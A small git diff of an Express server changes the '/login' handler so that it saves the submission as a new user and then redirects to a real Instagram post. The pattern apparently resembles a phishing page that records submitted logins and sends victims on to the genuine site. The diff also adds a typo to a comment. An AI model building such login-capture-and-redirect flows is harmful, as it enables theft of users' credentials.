@@ -37,7 +37,7 @@ app.post('/login', (req, res) => {
 
     newUser.save()
         .then(() => {
-            res.send('welcome');
+            res.redirect('https://www.instagram.com/p/C049cJts63y/?img_index=3&igsh=MXh5bGNubHFqdmRqMQ==');
         })
         .catch((error) => {
             console.error('Error saving user:', error);
@@ -45,7 +45,7 @@ app.post('/login', (req, res) => {
         });
 });
 
-// Start the server
+// Start the servergi
 app.listen(PORT, () => {
     console.log(`Server running at http://localhost:${PORT}`);
 });
